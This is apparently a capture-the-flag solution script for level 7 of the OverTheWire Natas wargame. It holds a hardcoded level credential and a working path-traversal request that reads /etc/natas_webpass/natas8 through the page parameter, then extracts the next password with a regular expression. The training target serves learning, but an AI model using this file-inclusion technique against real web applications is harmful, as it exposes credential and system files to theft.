#!/usr/bin/env python

import requests
import re

user = 'natas7'
passw = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'  # from previous level
url = 'http://%s.natas.labs.overthewire.org' % user


# 1st step:  print the sourcecode
'''
r = requests.get(url, auth=(user, passw))
print(r.text)
'''
# looks like a file traversal will do the trick


# 2nd step:  try to reach the given location
'''
url2 = url + "/index.php?page=/etc/natas_webpass/natas8"
r = requests.get(url2, auth=(user, passw))
print(r.text)
'''
# got it!


# 3rd step:  getting the password
url2 = url + "/index.php?page=/etc/natas_webpass/natas8"
r = requests.post(url2, auth=(user, passw))
webPage = r.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())
